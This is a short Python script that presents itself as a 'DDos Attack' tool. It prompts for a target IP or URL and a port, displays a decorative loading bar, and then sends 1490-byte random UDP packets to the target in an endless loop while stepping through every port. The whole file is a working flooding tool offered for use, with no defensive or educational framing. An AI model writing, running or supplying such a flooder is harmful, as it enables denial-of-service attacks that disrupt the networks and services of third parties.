# Auto install colorama if not present
try:
    from colorama import Fore, Style, init
except ImportError:
    import os
    os.system('pip install colorama')
    from colorama import Fore, Style, init

import os
import time
import socket
from socket import gethostbyname
import random
import pyfiglet
from datetime import datetime

init(autoreset=True)  # colorama init

# Time Info
now = datetime.now()

# UDP Socket Setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def ddos(sent, port):
    global ip
    while True:
        sock.sendto(bytes, (ip, int(port)))
        sent += 1
        port += 1
        print(Fore.RED + f"[ATTACK] Sent {sent} packets to {ip} through port: {port}")
        if port >= 65534:
            port = 1

def gethost(url):
    output = ''
    if '//' in url:
        output = url.split('//')[1]
        if '/' in output:
            output = output.split('/')[0]
    elif '/' in url:
        output = url.split('/')[0]
    return output

def getip(url):
    return gethostbyname(gethost(url))

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# Banner
print(Fore.MAGENTA + pyfiglet.figlet_format("DDos Attack"))

print(Fore.BLUE + "——————————————————————————————————————————————————————————————————————————")

# User input
ip = input(Fore.CYAN + "Target IP/URL : ")
if '//' in ip or 'https' in ip:
    ip = getip(ip)

port = input(Fore.CYAN + "Port          : ")

# Attack starting animation
os.system('cls' if os.name == 'nt' else 'clear')
print(Fore.MAGENTA + pyfiglet.figlet_format("Attack Starting"))

progress = [
    "Loading[=                   ] 1%",
    "Loading[====                ] 10%",
    "Loading[======              ] 20%",
    "Loading[========            ] 30%",
    "Loading[===========         ] 40%",
    "Loading[=============       ] 50%",
    "Loading[=================   ] 75%",
    "Loading[====================] 100%",
]

for step in progress:
    print(Fore.YELLOW + step)
    time.sleep(1.5)

sent = 0
port = int(port)

# Start attack
while True:
    ddos(sent, port)
